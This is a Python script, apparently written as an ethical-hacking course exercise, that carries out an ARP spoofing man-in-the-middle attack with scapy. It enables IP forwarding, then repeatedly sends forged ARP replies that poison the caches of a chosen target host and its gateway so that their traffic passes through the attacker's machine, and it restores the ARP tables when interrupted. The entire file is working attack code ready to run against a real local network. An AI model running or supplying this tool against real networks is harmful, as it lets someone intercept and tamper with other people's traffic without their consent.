#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import subprocess
import optparse

#target_ip="10.0.2.6"
#gateway_ip = "10.0.2.1"

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest="target_ip",
                      help=' Specify target IP Address ')
    parser.add_option('-g', '--gateway', dest="gateway_ip",
                      help=' Specify gateway IP, Try route -n')
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please Specify target IP, use --help")
    if not options.gateway_ip:
        parser.error("[-] Please Specify gateway IP, use --help")
    # For improvement add auto value in route -n
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # 34. Combining Frames Review
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # this returns two list; answered and unanswered
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst= destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ", shell=True)
    sent_packets_counts = 0
    options = get_arguments()

    target_ip = options.target_ip
    gateway_ip = options.gateway_ip

    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_counts = sent_packets_counts + 2
        print("\r[+] Packets Sent : {}".format(str(sent_packets_counts))),
        sys.stdout.flush()
        time.sleep(2)
        
except KeyboardInterrupt:
    print("[+] Detected Keyboard Interupt .... Resetting ARP Tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables are setted back from before")
